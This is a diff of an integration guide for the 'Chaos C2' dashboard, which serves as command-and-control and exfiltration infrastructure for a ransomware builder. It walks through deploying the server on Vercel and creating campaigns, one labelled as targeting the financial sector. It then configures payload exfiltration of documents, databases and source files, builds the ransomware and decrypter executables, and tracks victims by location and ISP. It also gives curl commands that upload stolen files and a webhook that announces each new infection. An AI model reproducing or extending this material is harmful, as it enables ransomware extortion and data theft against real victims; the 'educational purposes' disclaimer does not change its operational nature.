@@ -1,382 +1,269 @@
-# Chaos C2 Dashboard - Integration Guide
+# Integration Guide - Chaos C2 Dashboard
 
-Complete step-by-step guide to deploy the dashboard and integrate with Chaos Ransomware Builder payload.
-
-## Prerequisites
-
-- Node.js 18+ installed
-- Vercel account (free tier works)
-- Git repository (GitHub/GitLab/Bitbucket)
-- Chaos Ransomware Builder project built and ready
-
----
-
-## Step 1: Deploy Dashboard to Vercel
-
-### Option A: Vercel CLI (Recommended)
+## Quick Deploy
 
 ```bash
-# Navigate to dashboard folder
 cd vercel-dashboard
 
-# Install Vercel CLI globally
+# 1. Install Vercel CLI
 npm i -g vercel
 
-# Login to Vercel
+# 2. Login
 vercel login
 
-# Deploy to production
+# 3. Create KV Database
+# Vercel Dashboard → Storage → Create Database → KV
+# Copy KV_REST_API_URL and KV_REST_API_TOKEN
+
+# 4. Set Environment Variables (Vercel Project Settings → Environment Variables)
+MASTER_API_KEY=sk_admin_xxxxxxxxxxxx
+KV_REST_API_URL=https://xxx.kv.vercel-storage.com
+KV_REST_API_TOKEN=xxx
+
+# 5. Optional: External Storage for Large Files (>100KB)
+EXTERNAL_STORAGE_PROVIDER=r2
+EXTERNAL_STORAGE_BUCKET=chaos-exfil
+EXTERNAL_STORAGE_PUBLIC_URL=https://pub-xxx.r2.dev
+R2_ACCOUNT_ID=xxx
+R2_ACCESS_KEY_ID=xxx
+R2_SECRET_ACCESS_KEY=xxx
+
+# 6. Deploy
 vercel --prod
 ```
 
-### Option B: Git Integration
+## Payload Integration
 
-1. Push `vercel-dashboard` folder to a Git repository
-2. Go to [Vercel Dashboard](https://vercel.com/dashboard)
-3. Click "Add New..." → "Project"
-4. Import your repository
-5. Framework Preset: **Other**
-6. Build Command: `echo 'Static dashboard'`
-7. Output Directory: `dashboard`
-8. Click "Deploy"
+### 1. Configure Exfiltration
 
-### After Deploy
-
-Note your deployment URL: `https://your-project.vercel.app`
-
----
-
-## Step 2: Create Vercel KV Database
-
-1. In Vercel Dashboard, select your project
-2. Go to **Storage** tab
-3. Click **Create Database** → **KV**
-4. Name it (e.g., `chaos-c2-kv`)
-5. Select region closest to your users
-6. Click **Create**
-
-### Configure Environment Variables
-
-1. Go to **Settings** → **Environment Variables**
-2. Add these two variables (from KV database details):
-
-| Name | Value | Environment |
-|------|-------|-------------|
-| `KV_REST_API_URL` | `https://api.vercel.com/v1/kv/...` | Production, Preview, Development |
-| `KV_REST_API_TOKEN` | `Bearer ...` | Production, Preview, Development |
-
-3. **Optional**: Add master key for dashboard admin access:
-| Name | Value | Environment |
-|------|-------|-------------|
-| `MASTER_API_KEY` | `master_$(openssl rand -hex 16)` | Production, Preview, Development |
-
-4. Redeploy: `vercel --prod` (or push new commit)
-
----
-
-## Step 3: Configure Payload
-
-### Create Campaign
-
-1. Visit `https://your-project.vercel.app/dashboard`
-2. Click **Sign In** (top right)
-3. Enter your `MASTER_API_KEY` from Step 2
-4. Click **Campaigns** in sidebar
-5. Click **+ Create Campaign**
-6. Fill in:
-   - **Name**: `Operation Goldmine`
-   - **Description**: `Targeting financial sector`
-   - **API Key**: Leave blank (auto-generates `ck_xxx`)
-   - **RSA Key Size**: `4096`
-   - **Status**: `Active`
-7. Click **Create Campaign**
-8. **Copy the API Key** (clipboard icon) - you'll need this for payload config
-
-### Update Payload Config
-
-Copy the template and customize:
-
-```bash
-cp vercel-dashboard/payload.config.dashboard.json payload.config.json
-```
-
-Edit `payload.config.json`:
+Update `payload.config.json`:
 
 ```json
 {
   "exfiltration": {
     "enabled": true,
     "serverUrl": "https://your-project.vercel.app",
-    "apiKey": "ck_your_copied_campaign_key_here",
+    "apiKey": "ck_yourcampaignkey",
     "maxFileSizeMB": 50,
-    "targetExtensions": [
-      ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
-      ".sql", ".db", ".sqlite", ".json", ".xml",
-      ".cs", ".cpp", ".h", ".py", ".js", ".ts",
-      ".ini", ".cfg", ".config", ".bak"
-    ],
-    "skipExtensions": [
-      ".exe", ".dll", ".sys", ".msi", ".iso"
-    ],
+    "targetExtensions": [".txt", ".doc", ".pdf", ".sql", ".json", ".cs", ".py"],
+    "skipExtensions": [".exe", ".dll", ".sys"],
     "maxFiles": 1000,
     "compress": true,
     "encrypt": true,
     "timeoutSeconds": 30,
     "retryCount": 3,
-    "retryDelaySeconds": 5
+    "retryDelaySeconds": 5,
+    "chunkSizeKB": 90,
+    "enableDeduplication": true,
+    "rateLimitBackoff": true
   }
 }
 ```
 
-**Critical**: Replace `your-project.vercel.app` with your actual Vercel deployment URL.
+### 2. Use Enhanced Exfiltration Module
 
----
+Replace the `Exfiltration` class in `PayloadSource_v2.cs` with `Exfiltration_FullIntegration.cs`.
 
-## Step 4: Use Enhanced Exfiltration Module
+Key improvements:
+- **Automatic chunked upload** for files >90KB (server KV limit)
+- **SHA256 deduplication** - server rejects duplicates
+- **Rate limit handling** - respects `Retry-After` header, exponential backoff
+- **Heartbeat throttling** - client-side 1/min + server-side 60/min enforcement
+- **Optimistic locking** - registration handles concurrent payloads
 
-The standard `Exfiltration` class in `PayloadSource_v2.cs` only uploads files. For full dashboard integration (system registration, heartbeats, stats), replace it:
-
-### Option A: Replace Entire Class
-
-1. Open `PayloadSource_v2.cs`
-2. Find the `Exfiltration` class (around line 1060)
-3. Replace the entire class with contents of `vercel-dashboard/Exfiltration_FullIntegration.cs`
-4. Add required `using` statements at top:
-```csharp
-using System.Text;
-using System.Collections.Generic;
-```
-
-### Option B: Use Basic Compatible Version
-
-If you only need file upload with metadata headers:
-
-1. Replace `Exfiltration` class with `vercel-dashboard/Exfiltration_DashboardCompatible.cs`
-2. This adds `X-File-Name` header for dashboard file tracking
-
----
-
-## Step 5: Generate Keys & Build Payload
+### 3. Build Payload
 
 ```bash
-# In Chaos Ransomware Builder root directory
-
-# Generate RSA-4096 key pair for campaign
+# Generate RSA keys (dashboard now does this automatically on campaign creation)
+# But for local testing:
 dotnet run -- gen-keys -d ./keys -n mycampaign
 
-# Build payload + decrypter
-dotnet run -- build -c payload.config.json --keys-dir ./keys --key-name mycampaign
+# Build with dashboard config
+dotnet run -- build -c payload.config.dashboard.json --keys-dir ./keys --key-name mycampaign
 ```
 
-Output in `./output/`:
-- `payload.exe` - The ransomware with dashboard integration
-- `decrypter.exe` - Victim decryption tool
-- `build.config.json` - Exact config used
+## Dashboard Usage
 
----
+### Access
+Visit `https://your-project.vercel.app/dashboard`
 
-## Step 6: Test Integration
+### Authentication
+1. Click **Sign In** (top right)
+2. Enter **Master API Key** (admin) OR **Campaign API Key** (affiliate)
+3. Dashboard scopes to your campaign automatically
 
-### Test Dashboard API
+### Navigation
 
-```bash
-# Test campaign creation
-curl -X POST https://your-project.vercel.app/api/campaigns \
-  -H "Content-Type: application/json" \
-  -d '{"name":"Test","apiKey":"ck_test123"}'
+| View | Purpose |
+|------|---------|
+| **Overview** | Global stats, daily charts, recent infections, campaign performance |
+| **Systems** | Full system table with search, filters, pagination, CSV export |
+| **Campaigns** | Campaign cards with keys, stats, actions (admin only) |
+| **Analytics** | 30-day trends, extensions, heatmap, campaign radar |
+| **Geographic** | Country/city breakdown, ISP tracking |
+| **Timeline** | Real-time event stream (SSE), time-series charts |
+| **Files** | File explorer (filter by system/campaign), download via signed URLs |
 
-# Test system registration (simulates payload)
-curl -X POST https://your-project.vercel.app/api/systems \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer ck_test123" \
-  -d '{"campaignId":"camp_abc123","victimId":"TEST-PC_user","systemInfo":{"hostname":"TEST-PC","username":"user","os":"Windows 10"}}'
+### Campaign Management (Admin)
+- **Create**: Click `+ New Campaign` → auto-generates RSA-4096 keypair
+- **Edit**: Click `Details` → `Edit` on any campaign card
+- **API Keys**: Copy (clipboard) or Regenerate (refresh)
+- **Delete**: Removes campaign + all systems + all files (irreversible)
 
-# Test file upload
-curl -X POST https://your-project.vercel.app/api/exfil/upload \
-  -H "Authorization: Bearer ck_test123" \
-  -H "X-File-Name: test.txt" \
-  --data-binary @test.txt
+### System Actions
+- **View Details**: Click any row → forensic modal with files
+- **Delete**: Admin only (trash icon)
+- **Export CSV**: All filtered systems → `systems_YYYY-MM-DD.csv`
 
-# Test stats
-curl "https://your-project.vercel.app/api/stats?range=7d"
-```
+## API Endpoints
 
-### Test Payload (Safe Environment Only!)
+### Payload-Facing (Require Campaign API Key)
 
-1. Run `payload.exe` in isolated VM
-2. Check dashboard:
-   - **Overview** → Should show 1 infection
-   - **Systems** → Should show your VM with hostname/IP
-   - **Files** → Should show exfiltrated files
-   - **Geographic** → Should show your location
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| POST | `/api/systems` | Register new infected system |
+| PUT | `/api/systems` | Heartbeat / stats update |
+| POST | `/api/exfil/upload` | Upload exfiltrated file (supports chunking) |
+| GET | `/api/systems?id=` | Get system details (own campaign only) |
 
----
+### Dashboard-Facing (Require Master API Key)
 
-## Step 7: Production Hardening
+| Method | Endpoint | Description |
+|--------|----------|-------------|
+| GET | `/api/campaigns` | List all campaigns |
+| POST | `/api/campaigns` | Create campaign (generates RSA keys) |
+| PUT | `/api/campaigns` | Update campaign |
+| DELETE | `/api/campaigns?id=` | Delete campaign |
+| GET | `/api/stats?campaignId=&range=` | Campaign statistics |
+| GET | `/api/stats?range=` | Global statistics |
+| GET | `/api/realtime/events` | SSE real-time event stream |
+| GET | `/api/realtime/events?since=` | Polling fallback |
 
-### Secure Dashboard Access
-
-Add authentication middleware. Create `vercel-dashboard/api/_middleware.js`:
-
-```javascript
-// Simple IP allowlist
-const ALLOWED_IPS = process.env.ALLOWED_IPS?.split(',') || [];
-
-export default function middleware(request) {
-  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() 
-           || request.headers.get('x-real-ip');
-  
-  if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(ip)) {
-    return new Response('Forbidden', { status: 403 });
-  }
-  
-  return NextResponse.next();
-}
-
-export const config = {
-  matcher: ['/dashboard/:path*', '/api/:path*']
-};
-```
-
-Add `ALLOWED_IPS` to Vercel env vars (comma-separated).
-
-### Rate Limiting
-
-```javascript
-// In each API route, add:
-import { Ratelimit } from '@upstash/ratelimit';
-import { Redis } from '@upstash/redis';
-
-const ratelimit = new Ratelimit({
-  redis: Redis.fromEnv(),
-  limiter: Ratelimit.slidingWindow(100, '1 m'),
-});
-
-const { success } = await ratelimit.limit(ip);
-if (!success) return response.status(429).json({ error: 'Rate limited' });
-```
-
-### Enable Vercel Analytics
-
-1. Project Settings → Analytics → Enable
-2. Adds page views, performance metrics
-
----
-
-## Payload → Dashboard Data Flow
+### Event Types (SSE)
 
 ```
-┌────────────────────────────────────────────────────────────────────┐
-│                        PAYLOAD EXECUTION                            │
-└────────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  1. FIRST RUN: Register System                                     │
-│     POST /api/systems                                              │
-│     Body: { campaignId, victimId, systemInfo }                    │
-│     Headers: Authorization: Bearer <campaignKey>                  │
-│     Response: { systemId, isNew }                                 │
-└────────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  2. PERIODIC: Heartbeat (every 60s)                                │
-│     PUT /api/systems                                               │
-│     Body: { id: systemId, stats: { filesEncrypted, ... } }        │
-│     Updates: lastSeen, status=active, counters                    │
-└────────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  3. EXFILTRATION: Upload Files                                     │
-│     POST /api/exfil/upload (per file)                              │
-│     Headers: Authorization, X-File-Name, X-System-Id              │
-│     Body: Raw file bytes (compressed/encrypted)                   │
-│     Response: { fileId, success }                                 │
-└────────────────────────────────────────────────────────────────────┘
-                                │
-                                ▼
-┌────────────────────────────────────────────────────────────────────┐
-│  4. DASHBOARD: Real-time via SSE                                   │
-│     GET /api/realtime/events?campaignId=...&types=stats,systems   │
-│     Events: stats, systems, campaignStats, newFile, heartbeat     │
-└────────────────────────────────────────────────────────────────────┘
+connected          - Connection established
+heartbeat          - 30s keepalive
+system:registered  - New infection
+system:status      - Status change (active/idle/offline)
+system:deleted     - System removed
+file:uploaded      - File exfiltrated
+campaign:created   - New campaign
+campaign:updated   - Campaign modified
 ```
 
----
+## Rate Limits (Per Campaign)
+
+| Operation | Limit | Window |
+|-----------|-------|--------|
+| System Registration | 10 | 1 minute |
+| Heartbeat | 60 | 1 minute |
+| File Upload | 100 | 1 minute |
+| Chunked Upload | 500 | 1 minute |
+
+Headers returned:
+- `X-RateLimit-Limit`
+- `X-RateLimit-Remaining`
+- `X-RateLimit-Reset`
+- `Retry-After` (on 429)
+
+## File Storage
+
+| Size | Storage |
+|------|---------|
+| ≤ 100KB | Vercel KV (base64, 30-day TTL) |
+| > 100KB | Chunked to KV (90KB/chunk) |
+| > 100KB + External Config | R2 / S3 / Vercel Blob |
+
+External files return `downloadUrl` in metadata for direct access.
+
+## KV Data Model (Updated)
+
+```
+campaign:{id}                    → { id, name, apiKey, publicKeyPem, privateKeyPem, ... }
+campaign:{id}:stats              → HASH { totalInfections, totalFiles, totalBytes, lastActivity }
+campaign:{id}:systems            → SET of systemIds
+campaign:{id}:daily:{YYYY-MM-DD} → HASH { infections, uploads, bytes }
+campaign:{id}:exts               → HASH { ext: count }
+
+system:{id}                      → { id, victimId, campaignId, hostname, username, os, ip, country, city, isp, status, firstSeen, lastSeen, version, tags }
+system:{id}:stats                → HASH { filesEncrypted, filesExfiltrated, bytesExfiltrated, ransomNoteDropped }
+system:{id}:files                → SET of fileIds
+system:{id}:campaigns            → SET of campaignIds
+system:{id}:lock                 → Temporary registration lock (TTL 10s)
+
+file:{id}:meta                   → { id, systemId, campaignId, fileName, fileExt, size, uploadedAt, contentType, storage: {type, provider, key, url}, hash, chunked }
+file:{id}:data                   → base64 content (KV, ≤100KB, TTL 30d)
+file:{id}:chunk:{index}          → base64 chunk (KV, TTL 24h)
+
+global:campaigns                 → SET of campaignIds
+global:systems                   → SET of systemIds
+global:files                     → SET of fileIds
+global:stats                     → HASH { totalInfections, totalFiles, totalBytes }
+global:daily:{YYYY-MM-DD}        → HASH { uploads, bytes }
+global:exts                      → HASH { ext: count }
+```
+
+## Vercel Limits (Hobby Plan)
+
+| Resource | Limit | Notes |
+|----------|-------|-------|
+| KV Storage | 256 MB | ~2M small records |
+| KV Reads/Day | 100,000 | Dashboard polls + SSE |
+| KV Writes/Day | 10,000 | Registrations + heartbeats + uploads |
+| Function Duration | 30s | Configured in vercel.json |
+| Bandwidth | 100 GB/mo | File exfiltration counts |
+
+**For production**: Upgrade to Pro for 1GB KV, 1M reads, 100K writes, 60s functions.
 
 ## Troubleshooting
 
-| Symptom | Cause | Fix |
-|---------|-------|-----|
-| Dashboard shows "Disconnected" | SSE failing | Check Vercel function logs, verify 30s timeout |
-| Systems not appearing | Payload can't reach API | Verify `serverUrl` in config, check firewall |
-| "KV not configured" error | Missing env vars | Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` |
-| Auth fails | Wrong API key | Use Campaign API Key (`ck_xxx`), not Master |
-| Files upload but not in dashboard | Missing headers | Ensure `X-File-Name` header sent |
-| Charts empty | No data yet | Wait for SSE or click Refresh |
-| Large files missing | KV size limit | Hobby plan: 100KB/key - only metadata stored |
-| CORS errors | Vercel config | Check `vercel.json` headers section |
+| Issue | Solution |
+|-------|----------|
+| "KV not configured" | Add `KV_REST_API_URL` + `KV_REST_API_TOKEN` to Vercel env vars |
+| SSE disconnects | Check function timeout (30s), verify Vercel plan |
+| Systems not appearing | Verify payload `serverUrl` + `/api/systems` POST, check API key |
+| Charts empty | Wait for SSE data or click Refresh, check browser console |
+| Auth fails | Verify API key matches campaign `apiKey` field |
+| Large files missing | Enable external storage (R2/S3/Blob) or check chunked upload |
+| 429 Rate Limited | Payload handles backoff automatically; check campaign limits |
+| Duplicate systems | Registration uses optimistic locking; safe to retry |
 
----
+## Security Considerations
 
-## Vercel Function Logs
+- **Payload endpoints require valid campaign API key**
+- **Admin endpoints require master key**
+- **CORS enabled** for payload uploads from any origin
+- **Rate limiting** prevents abuse and quota exhaustion
+- **Vercel KV encrypted at rest** (managed by Vercel)
+- **Consider**: IP allowlisting, audit logging, WAF rules
 
-```bash
-# View real-time logs
-vercel logs your-project.vercel.app --follow
+## Customization
 
-# Filter by function
-vercel logs your-project.vercel.app --follow | grep "api/systems"
+### Add Discord/Slack Alerts
+
+```javascript
+// In api/systems/index.js POST handler, after new system:
+await fetch('https://discord.com/api/webhooks/WEBHOOK_ID/TOKEN', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    content: `🦠 **New Infection**\nSystem: ${system.hostname}\nCampaign: ${campaign.name}\nLocation: ${city}, ${country}`
+  })
+});
 ```
 
----
+### Custom Chart Types
 
-## Scaling Considerations
+```javascript
+// In dashboard/app.js:
+new Chart(ctx, {
+  type: 'scatter',
+  data: { datasets: [{ label: 'Files', data: files.map(f => ({ x: f.uploadedAt, y: f.size })) }] },
+  options: { scales: { x: { type: 'time' }, y: { type: 'logarithmic' } } }
+});
+```
 
-| Scale | Recommendation |
-|-------|----------------|
-| < 100 infections/day | Hobby plan OK |
-| 100-1000/day | Pro plan (1GB KV, 1M reads) |
-| 1000+/day | Enterprise + external DB (PlanetScale, Neon) |
-| Large file storage | Use Vercel Blob or AWS S3 instead of KV |
+## License
 
----
-
-## Security Checklist
-
-- [ ] Master API Key stored only in Vercel env vars (not in code)
-- [ ] Campaign API Keys rotated periodically
-- [ ] Dashboard deployed to protected preview or with auth middleware
-- [ ] IP allowlist configured for admin access
-- [ ] Rate limiting enabled on API routes
-- [ ] Audit logging for sensitive operations (campaign delete, key regen)
-- [ ] Payload uses HTTPS only (enforced by Vercel)
-- [ ] KV data encrypted at rest (Vercel default)
-
----
-
-## Support Files
-
-| File | Purpose |
-|------|---------|
-| `vercel-dashboard/Exfiltration_FullIntegration.cs` | Full payload module with registration + heartbeats |
-| `vercel-dashboard/Exfiltration_DashboardCompatible.cs` | Basic module with file upload headers |
-| `vercel-dashboard/payload.config.dashboard.json` | Pre-configured payload config template |
-| `vercel-dashboard/README.md` | Full dashboard documentation |
-| `vercel-dashboard/INTEGRATION_GUIDE.md` | This file |
-
----
-
-## Next Steps
-
-1. **Customize Dashboard**: Modify `dashboard/app.js` for additional charts, views, or branding
-2. **Add Webhooks**: Discord/Slack/Telegram alerts on new infections
-3. **Implement Commands**: C2 command queue for payload tasking
-4. **Add Encryption**: Encrypt KV data at application layer
-5. **Build Mobile App**: React Native wrapper for dashboard
-
----
-
-**⚠️ Legal Notice**: This software is for educational/research purposes only. Unauthorized deployment against systems you don't own or have explicit permission to test is illegal. The authors assume no liability for misuse.
+Educational/Research purposes only. Unauthorized deployment against systems you don't own is illegal.
